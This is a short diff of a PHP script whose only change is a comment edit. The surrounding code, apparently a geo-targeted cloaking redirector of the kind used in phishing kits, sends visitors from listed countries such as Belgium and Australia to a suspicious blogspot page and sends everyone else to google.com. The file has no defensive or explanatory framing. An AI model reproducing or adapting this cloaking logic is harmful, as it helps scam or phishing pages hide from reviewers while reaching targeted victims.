@@ -10,6 +10,6 @@ if($dd == 'BE') {$ok = 1;}
 if($dd == 'AU') {$ok = 1;}
 
 if($ok == '1') {$ok = "https://foridmotin22.blogspot.com/ol/jziu.html";}else{$ok = "https://google.com";}
-//123
+//1234
 echo $ok;
 ?>
